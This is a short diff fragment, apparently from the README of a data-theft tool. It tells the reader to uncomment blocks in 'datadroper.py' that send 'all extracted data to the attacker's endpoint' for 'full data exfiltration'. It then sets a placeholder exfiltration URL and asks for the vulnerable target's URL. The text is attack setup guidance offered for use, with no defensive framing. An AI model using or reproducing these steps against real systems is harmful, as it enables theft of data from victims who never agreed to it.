@@ -35,7 +35,7 @@ Uncomment data-dropping sections
 
 In datadroper.py, there are commented blocks responsible for dropping all extracted data to the attacker’s endpoint. To enable full data exfiltration, locate:
 
-# target_link = "http://your-server.com/receive"
+target_link = "http://your-URL.com/"
 
 
 Provide the vulnerable endpoint URL
